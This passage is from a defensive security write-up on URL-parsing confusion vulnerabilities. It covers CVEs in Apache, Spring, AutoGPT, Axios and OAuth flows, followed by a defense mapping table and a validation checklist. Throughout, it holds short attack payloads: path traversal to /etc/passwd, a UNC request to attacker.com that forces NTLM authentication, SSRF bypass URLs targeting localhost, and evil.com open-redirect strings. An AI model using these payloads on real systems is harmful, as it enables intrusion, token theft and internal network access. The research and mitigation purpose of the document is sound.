- RFC 3986 interpretation differences (especially authority component extraction)

**Patch and Mitigation**:
- Upgrade to Spring Framework 6.1.5, 6.0.18, 5.3.33 or higher
- Or use same parser for validation and requests

---

### 19. SharePoint XXE via URL Parsing Confusion (CVE-2024-30043)

**Vulnerability Description**:
URL parsing confusion in SharePoint Server and Cloud exploited for XXE (XML External Entity) injection → File reading and SSRF.

**Attack Mechanism**:
1. SharePoint's XML parser and URL validation logic interpret URLs differently
2. Attacker inserts manipulated URL into XML
3. URL validation layer: Judges as safe host
4. XML parser: Accesses internal files or internal network via external entity

**Spec-Related Root Cause**:
- Interaction inconsistency between XML specification and URI specification
- URL parsing differential (parser A vs parser B)

**Patch**:
- Apply Microsoft May 2024 security update

---

### 20. Apache HTTP Server Confusion Attacks (CVE-2024-38473, CVE-2024-38476, CVE-2024-38477)

**Researcher**: Orange Tsai (DEVCORE), Black Hat USA 2024

**Vulnerability Overview**:
3 types of confusion attacks in Apache HTTP Server's architectural design:
1. **Filename Confusion**: `r->filename` field should be filesystem path but some modules treat it as URL
2. **DocumentRoot Confusion**: DocumentRoot validation bypass when accessing via absolute path
3. **Handler Confusion**: Request handler selection logic confusion

**Attack Vectors**:
```
Example 1: DocumentRoot Escape
GET /cgi-bin/../../../../../etc/passwd HTTP/1.1

Example 2: ACL Bypass
GET /protected/resource?query HTTP/1.1
→ Single '?' bypasses ACL/Auth

Example 3: Forced NTLM Authentication via Backslash
GET \\attacker.com\share HTTP/1.1
→ Interpreted as UNC path → NTLM auth sent → SSRF → NTLM Relay → RCE
```

**Spec-Related Root Cause**:
- Unclear boundary between URL parsing and filesystem path processing
- Confusion between RFC 3986 path delimiters and filesystem delimiters

**Patch**:
- Apache HTTP Server 2.4.60 (July 1, 2024)

---

### 21. URL Normalization SSRF in Axios (#7315)

**Vulnerability Description**:
JavaScript HTTP client library Axios auto-normalizes URLs, bypassing SSRF filters.

**Attack Mechanism**:
```javascript
// Attacker input
const url = "https:google.com";  // Missing slash

// Security filter: Check for "://" pattern
if (!url.includes("://")) {
    throw new Error("Invalid URL");  // Block
}

// Axios: Auto-normalization
axios.get(url);  // Internally converts to https://google.com → SSRF
```

**Spec-Related Root Cause**:
- RFC 3986: `://` required after scheme
- Axios: Lenient parsing with auto-correction

**Mitigation**:
- Use latest Axios version or strengthen URL validation

---

### 22. Path Traversal via Percent-Encoding (CVE-2021-41773, CVE-2021-42013)

**Vulnerability Description**:
In Apache HTTP Server 2.4.49, 2.4.50, path normalization logic changes caused percent-encoded path traversal characters to not be processed, leading to authentication bypass and arbitrary file reading.

**Attack Mechanism**:
```
GET /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1

Before 2.4.49: /.%2e/ → /../ normalized → Path traversal blocked
2.4.49: Doesn't normalize /.%2e/ → Passes as-is → /etc/passwd access
```

**Spec-Related Root Cause**:
- RFC 3986 §6.2.2: Unclear ordering of percent-decoding and path normalization
- Security implications not considered during implementation changes

**Patch**:
- Apache 2.4.51 or higher

---

### 23. AutoGPT SSRF via URL Parsing Confusion (CVE-2025-0454)

**Vulnerability Description**:
Server-Side Request Forgery (SSRF) vulnerability in autogpt (significant-gravitas/autogpt) versions prior to v0.4.0 due to hostname confusion between `urlparse` and `requests` library.

**Affected Versions**:
- autogpt versions < v0.4.0

**Attack Mechanism**:
```python
# Vulnerable code pattern
from urllib.parse import urlparse
import requests

url = "http://localhost:\@google.com/../"

# Stage 1: urlparse validation
parsed = urlparse(url)
# urlparse interprets: hostname = "localhost:" (with colon!)

if parsed.hostname != "localhost":  # False - validation passes!
    # Stage 2: requests library
    requests.get(url)  # requests interprets differently → SSRF
```

The hostname confusion involves colon-slash constructs (`:\@`) that tricked the parser into treating localhost as remote.

**Spec-Related Root Cause**:
- **urllib.parse.urlparse**: Includes colon in hostname extraction for certain malformed URLs
- **requests library**: Parses the URL differently, removing the colon and treating as localhost
- Violation of "validate the final parsed hostname" principle

**CVSS Score**: 7.5 (High)

**Patch and Mitigation**:
- Upgrade to autogpt v0.4.0 or higher
- Always validate the **final parsed hostname** used by the actual request library, not just the validation parser
- Use the same parser for both validation and execution

---

### 24. mod_auth_openidc Open Redirect via URL Parsing Differential (CVE-2021-39191, CVE-2021-32786)

**Vulnerability Description**:
URL parsing differential between Apache HTTP Server and modern browsers in mod_auth_openidc (popular Apache2 OAuth/OpenID Connect module) leading to Open Redirect in logout functionality.

**Affected Versions**:
- mod_auth_openidc < 2.4.9
- Specifically affects logout redirect_uri validation

**Attack Mechanism**:
```
Attack Vector: Backslash Confusion

Normal logout:
https://oauth-app.com/logout?redirect_uri=https://trusted.com

Attack with backslash:
https://oauth-app.com/logout?redirect_uri=/\tevil.com
                                                    ↑ Tab character

Validation (oidc_validate_redirect_url):
- Checks if URL starts with "/" → Appears to be relative path → Allowed

Browser interpretation:
- Parses /\tevil.com as absolute URL → Redirects to evil.com
```

**Spec-Related Root Cause**:
- **Apache2 mod_auth_openidc**: The `oidc_validate_redirect_url()` function doesn't properly parse URLs starting with `/\t` (forward slash + tab)
- **Modern browsers**: Treat backslash as equivalent to forward slash in certain contexts
- WHATWG vs RFC 3986 interpretation differences

**Impact**:
- CVSS Score: 4.7 (Medium)
- Open Redirect leading to phishing attacks
- OAuth token/code interception

**Patch**:
- Fixed in mod_auth_openidc version 2.4.12.2
- Maintainers responded and patched within 24 hours

---

### 25. parse-url Library SSRF Vulnerabilities (CVE-2022-2216, CVE-2022-2900)

**Vulnerability Description**:
Multiple SSRF vulnerabilities in the parse-url npm library due to improper detection of protocol, resource, and pathname fields.

**Affected Versions**:
- parse-url < 8.1.0 (CVE-2022-2216)
- parse-url < 6.0.2 (CVE-2022-2900)

**Attack Mechanism**:
```javascript
// Vulnerable code using parse-url
const parseUrl = require("parse-url");

// Attack payload
const maliciousUrl = "http://127.0.0.1#@attacker.com/";

const parsed = parseUrl(maliciousUrl);
// Library incorrectly parses components

// Validation checks parsed.resource
if (allowedDomains.includes(parsed.resource)) {
    // Assumes checking attacker.com
    fetch(maliciousUrl); // Actually requests 127.0.0.1
}
```

**Spec-Related Root Cause**:
- Incorrect handling of fragment identifier (`#`) in authority component
- Confusion between userinfo and fragment delimiters
- Non-compliance with RFC 3986 component extraction rules

**Impact**:
- SSRF attacks bypassing domain validation
- Access to internal network resources
- Cloud metadata endpoint access (AWS, GCP, Azure)

**Patch**:
- Upgrade to parse-url 8.1.0 or higher

---

### 26. OAuth "Evil Slash" Attacks (Black Hat Asia 2019)

**Research**: "Make Redirection Evil Again: URL Parser Issues in OAuth" by Xianbo Wang et al.

**Overview**:
Comprehensive study of new OAuth redirection attack techniques exploiting URL parsing inconsistencies in mainstream browsers and mobile apps.

**Attack Techniques**:

1. **Evil Slash Trick**:
```
Legitimate redirect_uri: https://trusted.com/callback

Attack variations:
- https://trusted.com\@evil.com/callback
- https://trusted.com/\@evil.com/callback
- https://trusted.com//evil.com/callback
- https://trusted.com\tevil.com/callback

Validation: Checks if URL starts with "https://trusted.com" → Pass
Browser: Interprets differently → Redirects to evil.com
```

2. **Domain Whitelist Bypass**:
```
Whitelist check: "Does redirect_uri contain trusted.com?"

Attack: https://evil.com?redirect=trusted.com
       https://evil.com#trusted.com
       https://trusted.com@evil.com
```

**Impact**:
- **Scope**: Study of 50 OAuth service providers worldwide
- **Affected**: 10,000+ OAuth client apps
- **Users**: Tens of millions of end-users vulnerable
- **Consequences**: Account hijacking, sensitive data access, privilege escalation

**Attack Outcomes**:
- Steal OAuth authorization codes
- Steal OAuth access tokens
- Full account takeover
- Access to cloud resources (API keys, storage)

**Tools Released**:
- [redirect-fuzzer](https://github.com/SaneBow/redirect-fuzzer): Fuzzing tool for OAuth redirect_url validators

**Mitigation**:
- Exact string matching for redirect_uri validation (not prefix or contains)
- Use allowlist of full redirect URIs, not domain-based validation
- Implement RFC 8252 recommendations for native apps

---

### 27. TOCTOU (Time-of-Check Time-of-Use) in URL Validation

**Vulnerability Pattern**:
Race condition between URL validation and actual HTTP request execution, particularly with DNS-based validation.

**Attack Mechanism**:
```python
# Vulnerable code pattern
def make_request(url):
    # Stage 1: Time of Check - DNS validation
    parsed = urlparse(url)
    ip = socket.gethostbyname(parsed.hostname)

    if is_internal_ip(ip):  # Check: 1.2.3.4 (external) → Allow
        raise SecurityError("Internal IP blocked")

    # ⚠️ TIME GAP - Attacker can change DNS here

    # Stage 2: Time of Use - Actual request
    response = requests.get(url)  # Use: Now resolves to 127.0.0.1!
    return response
```

**DNS Rebinding Attack**:
```
1. Attacker registers: attacker.com
2. DNS server configured with very short TTL (1 second)

Initial DNS query (validation):
attacker.com → 1.2.3.4 (public IP)
Validation: Not internal → Pass

After validation, before request:
DNS TTL expires, attacker changes record

Second DNS query (actual request):
attacker.com → 127.0.0.1 (localhost)
Request: Accesses internal service!
```

**Real-World Example**:
```
Complete SSRF Protection Bypass via TOCTOU (Manager.io)

The system validates DNS responses before HTTP requests
BUT the HTTP client follows redirects autonomously
Result: Initial validation bypassed by redirect to internal IP
```

**Spec-Related Root Cause**:
- RFC 3986 doesn't address timing of hostname resolution
- No specification for when DNS queries should occur relative to validation
- HTTP client libraries often re-resolve DNS independently

**Mitigation Strategies**:
1. **Pin resolved IP**: Validate DNS, then force HTTP client to use that specific IP
2. **Disable redirects**: Don't follow HTTP redirects automatically
3. **Re-validate after resolution**: Check IP again immediately before request
4. **Use connection pooling**: Reuse validated connections
5. **Atomic operations**: Combine validation and request in single atomic operation

**2023 Research Update**:
- W3C Local Network Access specification aims to prevent DNS rebinding
- Google deployed DNS Bit 0x20 feature (January 2023) to make cache poisoning harder
- NCC Group Singularity framework for testing DNS rebinding defenses

---

### 28. "yoU aRe a Liar" - Systematic URL Parser Testing Framework (2022)

**Research**: IEEE Security and Privacy Workshops (SPW) 2022
**Authors**: Dashmeet Kaur Ajmani, Igibek Koishybayev, Alexandros Kapravelos

**Overview**:
First unified framework for cross-testing URL parsers, exposing systematic inconsistencies across implementations.

**Methodology**:
1. Collected testing suites from 8 popular URL parsers
2. Extracted 1,445 URLs from their test cases
3. Cross-tested every URL against all 8 parsers
4. Analyzed inconsistencies

**Parsers Tested**:
- cURL (C)
- Chromium (C++)
- Python urllib
- Java URL/URI
- Node.js url
- Go net/url
- Ruby URI
- Whatwg-url (JavaScript reference implementation)

**Key Findings**:

**4,262 total inconsistencies discovered**:
- **56% were Same-Origin Policy (SOP) differences**
- Different parsing of scheme, host, port leading to SOP bypass
- Critical for browser security model

**Categories of Inconsistencies**:

1. **Scheme Parsing**:
   - Some parsers require `://` after scheme
   - Others accept single `:` or no delimiter
   - Leads to scheme confusion attacks

2. **Host Extraction**:
   - Different handling of userinfo (`user:pass@`)
   - IPv6 literal parsing differences (`[::1]`)
   - Port number inclusion/exclusion

3. **Path Normalization**:
   - `.` and `..` segment handling
   - Percent-encoding in path traversal
   - Case sensitivity differences

4. **Query and Fragment**:
   - Fragment delimiter precedence
   - Query parameter parsing in userinfo

**Security Implications**:

```
Example: SOP Bypass via Parser Differential

URL: http://user@evil.com:80@trusted.com/

Parser A (Browser):
- host: "trusted.com"
- SOP check: Allows access to trusted.com cookies

Parser B (Backend validation):
- host: "user@evil.com:80@trusted.com" (entire string)
- Validation: Rejects (not in allowlist)

Attacker bypasses backend validation but gains browser access
```

**Impact on Real Systems**:
- Phishing attacks via URL spoofing
- SSRF via validation bypass
- Remote code execution via parser confusion
- Cross-site scripting via SOP bypass

**Recommendations**:
1. Standardize URL parsing across security-critical components
2. Use RFC 3986-compliant parsers
3. Test parsers with adversarial inputs
4. Implement parser differential detection in CI/CD

**Tools & Resources**:
- Framework available for testing custom parsers
- Test suite with 1,445+ edge case URLs
- Academic paper: [yoU aRe a Liar](https://secweb.work/papers/2022/ajmani2022youare.pdf)

---

### 29. Claroty Team82 & Snyk Joint Research: URL Confusion in Industrial Systems

**Research Date**: 2022-2023
**Scope**: Industrial/OT systems, 16 URL parsing libraries

**Key Findings**:

**Five Classes of URL Confusion**:

1. **Scheme Confusion**:
   - No scheme vs. default scheme assumption
   - `//host/path` interpreted as scheme-less or `file://`

2. **Slashes Confusion**:
   - Single `/` vs double `//` after scheme
   - `http:/evil.com` vs `http://evil.com`

3. **Backslash Confusion**:
   - Windows path separators in URLs
   - `http:\\host` treated as `http://host` or error

4. **URL Encoded Data Confusion**:
   - When to decode: before or after validation
   - Recursive decoding vs. single-pass

5. **Scheme Mixup**:
   - Confusion between `http`, `https`, `file`, `ftp`
   - Default scheme inference inconsistencies

**Vulnerable Libraries Examined**:
- urllib (Python)
- urllib3 (Python)
- cURL
- Chrome
- Java URL and URI classes
- PHP parse_url
- Node.js url module
- Go net/url
- Ruby URI
- Perl URI
- And 6 others

**Discovered Vulnerabilities**:
- **8 vulnerabilities** privately disclosed and patched
- Potential for:
  - Denial of Service (DoS)
  - Information leaks
  - Remote Code Execution (RCE) in some cases

**Industrial Control Systems Impact**:
- OT/ICS environments particularly vulnerable
- Legacy systems with outdated parsers
- Safety-critical systems affected
- Recommendation: Immediate patching required

**SecurityWeek Advisory (2023)**:
> "Industrial firms advised not to ignore security risks posed by URL parsing confusion"

**Mitigation for Industrial Systems**:
1. Inventory all systems using URL parsing
2. Identify which parsing library/version in use
3. Test with fuzzing frameworks
4. Apply vendor patches immediately
5. Implement network segmentation
6. Monitor for anomalous URL patterns

---

## Appendix: Attack-Spec-Defense Mapping Table

| Attack Type | Exploited Spec Behavior | RFC/Spec Reference | Attack Example | Spec-Based Defense |
|------------|------------------------|-------------------|---------------|-------------------|
| **Scheme Confusion** | RFC 3986 requires scheme, WHATWG allows relative URLs | RFC 3986 §3 vs WHATWG §4.1 | `google.com/abc` → Different parser interpretations | Allow absolute URIs only, use same parser |
| **Userinfo Spoofing** | `user:pass@host` syntax deprecated but valid | RFC 3986 §3.2.1, §7.5 | `https://trusted.com@evil.com` | Reject URLs with userinfo, follow WHATWG policy |
| **Percent-Encoding Recursive Decoding** | Non-compliance with prohibition on recursive decoding | RFC 3986 §2.4 MUST | `%252e%252e%252f` → 2 decodings → `../` | Decode exactly once, prohibit recursion |
| **Slashes/Backslash Confusion** | Unclear backslash handling | RFC 3986 (not specified) vs WHATWG | `https:\\evil.com` | Reject URLs with backslashes or explicit normalization |
| **IP Address Obfuscation** | Legacy IP notation support | RFC 3986 §7.4 | `http://0177.0.0.1` (octal) | Normalize all IP formats before validation, use dedicated IP parser |
| **Fragment-based XSS** | Fragment not sent to server | RFC 3986 §3.5 | `#<script>alert(1)</script>` | Fragment input validation, strengthen CSP |
| **Host Extraction Inconsistency** | Different behavior per `getHost()` method | Implementation differences | Java URL vs Python urlparse | Explicit parsing per RFC 3986, allow-list validation |
| **URL Encoding Confusion** | Encoded host processing inconsistency | RFC 3986 §2.1 | `http://127.%30.%30.1` | Decode immediately on input, validate after normalization |
| **Tabs/Newlines Removal** | WHATWG auto-removes control characters | WHATWG §4.1 | `http://trusted\n.com@evil.com` | Reject on finding control characters (prohibit auto-removal) |
| **Case Sensitivity Exploitation** | Scheme/host case-insensitive, path case-sensitive | RFC 3986 §6.2.2.1 | `/Admin` vs `/admin` | Validation matching server handling |
| **Path Traversal** | Path normalization algorithm | RFC 3986 §6.2.2.3 | `../../etc/passwd` | Strictly follow Decode → Normalize → Validate order |
| **Default Port Inconsistency** | Default port can be omitted | RFC 3986 §6.2.3 | `:80` vs omitted | Normalize by removing default port, store policies in normalized form |
| **Trailing Dot Confusion** | WHATWG distinguishes, DNS uses FQDN | WHATWG design decision | `example.com` vs `example.com.` | Remove trailing dot or explicitly reject |
| **IDN Homograph** | Unicode visual similarity | RFC 3987, WHATWG §3.3 | Cyrillic 'а' vs Latin 'a' | Punycode conversion, block mixed-script |
| **Cache Key Confusion** | Non-normalized URL → Different cache key | RFC 3986 §6.2.2 | `/api` vs `/api/%2F` | Generate cache key from normalized URL |
| **Parser Differential SSRF** | Validation parser ≠ Request parser | Implementation inconsistencies | Spring UriComponentsBuilder | Use same parser, apply Spring patches |
| **TOCTOU via DNS Rebinding** | Time gap between DNS validation and use | No spec for validation timing | DNS: 1.2.3.4 → validate → change to 127.0.0.1 → use | Pin resolved IP, disable redirects, re-validate |
| **Evil Slash OAuth Bypass** | Backslash/slash confusion in redirect_uri | WHATWG vs RFC 3986 | `https://trusted.com\@evil.com` | Exact string match for redirect_uri, not prefix matching |
| **Colon-Slash Hostname Confusion** | Colon included in hostname by some parsers | urlparse vs requests differential | `http://localhost:\@google.com` | Validate final parsed hostname from actual request library |
| **Fragment in Authority** | Fragment delimiter in userinfo/host | RFC 3986 precedence ambiguity | `http://127.0.0.1#@attacker.com` | Strict RFC 3986 component extraction, reject ambiguous URLs |
| **Scheme Inference** | Missing scheme inferred differently | RFC 3986 vs RFC 2396 vs WHATWG | `//host/path` interpreted as different schemes | Always require explicit absolute URI with scheme |
| **Backslash in OAuth redirect_uri** | Browser normalizes backslash to slash | WHATWG normalization | `/\tevil.com` appears relative but redirects absolute | Reject control characters and backslashes in redirect_uri |

---

## Appendix: Security Validation Checklist

### Input Validation Stage

- [ ] **1. Enforce Absolute URI**: Allow only absolute URIs with scheme specified (reject relative URLs)
- [ ] **2. Prohibit Userinfo**: Immediately reject URLs containing `user:pass@host` format
- [ ] **3. Check Control Characters**: Reject if contains control characters like tab (`\t`), newline (`\n`, `\r`), NULL (prohibit auto-removal)
- [ ] **4. Check Backslashes**: Reject if contains backslash (`\`) or establish explicit normalization policy

### Normalization Stage

- [ ] **5. Percent-Decoding (Once Only)**: Decode exactly once immediately upon receiving input (prohibit recursive decoding)
- [ ] **6. Decode Unreserved Characters**: Decode when finding `A-Za-z0-9-._~` encoding
- [ ] **7. Lowercase Scheme/Host**: Convert only scheme and host to lowercase (preserve path case)
- [ ] **8. Path Normalization**: Apply `remove_dot_segments` algorithm (remove `.` and `..`)
- [ ] **9. Remove Default Port**: Remove when default port specified (HTTP:80, HTTPS:443, etc.)
- [ ] **10. Handle Trailing Dot**: Remove trailing `.` in domain or establish explicit policy
- [ ] **11. IDN Punycode Conversion**: Convert Unicode domains to Punycode

### Security Validation Stage

- [ ] **12. IP Address Normalization**: Convert all formats (octal, hex, integer) to canonical form before validation
- [ ] **13. Allow-list Validation**: Compare scheme, host, port combination against allow-list (prohibit deny-lists)
- [ ] **14. Block Internal IPs**: Check if normalized IP is in internal network ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, etc.)
- [ ] **15. Path Scope Validation**: Verify normalized path is inside DocumentRoot or allowed directory
- [ ] **16. Symlink Validation**: Resolve symlink paths to actual paths (`realpath()`) and re-validate

### Execution Stage

- [ ] **17. Use Same Parser**: Perform actual request with same parser used for validation
- [ ] **18. Prohibit Re-parsing**: Never re-parse URL after validation (reuse validated object)
- [ ] **19. Restrict Redirects**: Disable automatic HTTP redirect following or validate redirect targets too
- [ ] **20. Set Timeouts**: Set short connection and read timeouts to prevent slowloris attacks

### Logging and Monitoring

- [ ] **21. URL Masking**: Mask userinfo, fragments, sensitive query parameters in URLs before logging
- [ ] **22. Failure Logging**: Log input values and failure reasons on URL validation failures (for attack pattern analysis)
- [ ] **23. Anomaly Pattern Detection**: Alert on repeated validation failures from same IP

### Architecture Level

- [ ] **24. Single URL Parser Library**: Use only one verified URL parser library across entire application
- [ ] **25. Regular Updates**: Keep URL parser libraries and HTTP clients updated (monitor CVEs)
- [ ] **26. Principle of Least Privilege**: Minimize privileges of service accounts handling URL requests

---

## References and Sources

### RFCs and Standards
- [RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax](https://www.rfc-editor.org/rfc/rfc3986.html)
- [WHATWG URL Living Standard](https://url.spec.whatwg.org/)
- [RFC 3987 - Internationalized Resource Identifiers (IRIs)](https://www.rfc-editor.org/rfc/rfc3987.html)

### CVEs and Security Advisories
- [CVE-2025-0454: autogpt SSRF via URL Parsing Confusion](https://nvd.nist.gov/vuln/detail/CVE-2025-0454)
- [CVE-2024-22259: Spring Framework URL Parsing with Host Validation](https://spring.io/security/cve-2024-22259/)
- [CVE-2024-22243: Spring Framework URL Parsing with Host Validation](https://spring.io/security/cve-2024-22243/)
- [CVE-2024-22262: Spring Framework URL Parsing with Host Validation (3rd report)](https://spring.io/security/cve-2024-22262/)
- [CVE-2024-30043: SharePoint XXE via URL Parsing Confusion](https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud)
- [CVE-2024-38473, CVE-2024-38476, CVE-2024-38477: Apache HTTP Server Confusion Attacks](https://httpd.apache.org/security/vulnerabilities_24.html)
- [CVE-2022-2216, CVE-2022-2900: parse-url SSRF Vulnerabilities](https://security.snyk.io/vuln/SNYK-JS-PARSEURL-2936249)
- [CVE-2021-41773: Apache HTTP Server Path Traversal](https://www.hackthebox.com/blog/cve-2021-41773-explained)
- [CVE-2021-39191, CVE-2021-32786: mod_auth_openidc Open Redirect](https://security.snyk.io/vuln/SNYK-RHEL8-MODAUTHOPENIDC-1583397)

### Research Papers and Conference Presentations
- [Orange Tsai - Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server (Black Hat USA 2024)](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [PortSwigger Research - URL validation bypass cheat sheet (2024 Edition)](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
- [Snyk - URL confusion vulnerabilities in the wild: Exploring parser inconsistencies](https://snyk.io/blog/url-confusion-vulnerabilities/)
- [Claroty Team82 - Exploiting URL Parsing Confusion](https://claroty.com/team82/research/exploiting-url-parsing-confusion)
- [SonarSource - Security Implications of URL Parsing Differentials](https://www.sonarsource.com/blog/security-implications-of-url-parsing-differentials/)
- [Orange Tsai - A New Era of SSRF: Exploiting URL Parser in Trending Programming Languages (Black Hat 2017)](https://blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
- [Black Hat USA 2019 - HostSplit: Exploitable Antipatterns in Unicode Normalization](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)

### Practical Guides and Tools
- [OWASP - Server Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - What is SSRF (Server-side request forgery)?](https://portswigger.net/web-security/ssrf)
- [GitHub - Axios Issue #7315: Normalization of url cause an ssrf security bypass](https://github.com/axios/axios/issues/7315)
- [Joshua Rogers - proxy_pass: nginx's Dangerous URL Normalization](https://joshua.hu/proxy-pass-nginx-decoding-normalizing-url-path-dangerous)

### Other Resources
- [Wikipedia - Percent-encoding](https://en.wikipedia.org/wiki/Percent-encoding)
- [Neil Madden - Can you ever (safely) include credentials in a URL?](https://neilmadden.blog/2019/01/16/can-you-ever-safely-include-credentials-in-a-url/)
- [Medium - Say goodbye to URLs with embedded credentials](https://medium.com/@lmakarov/say-goodbye-to-urls-with-embedded-credentials-b051f6c7b6a3)

---

## Document Revision History

| Date | Version | Changes |
|------|---------|---------|
| 2026-02-08 | 1.0 | Initial draft - Security analysis based on RFC 3986 and WHATWG URL Standard |

---

**Disclaimer**: This document is written for educational and security research purposes. Unauthorized use of the attack techniques described herein is illegal, and the author is not responsible for misuse of this information.
